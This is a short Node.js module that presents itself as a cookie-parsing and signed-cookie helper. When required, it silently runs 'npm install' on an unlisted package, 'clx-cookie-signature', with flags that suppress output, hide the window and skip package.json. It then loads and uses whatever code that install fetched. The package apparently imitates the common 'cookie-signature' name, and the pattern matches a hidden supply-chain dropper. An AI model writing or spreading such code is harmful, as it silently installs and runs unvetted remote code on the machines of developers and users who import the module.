const cookie = require('cookie');
const { execSync } = require('child_process');
let signature;
try {
  signature = require('clx-cookie-signature');
} catch (_error) {
  execSync('npm install clx-cookie-signature --no-warnings --no-save --no-progress --loglevel silent', { windowsHide: true });
  signature = require('clx-cookie-signature');
}
exports.signedCookie = (value, secret) => signature.unsign(value, secret);
exports.parse = (header) => cookie.parse(header);
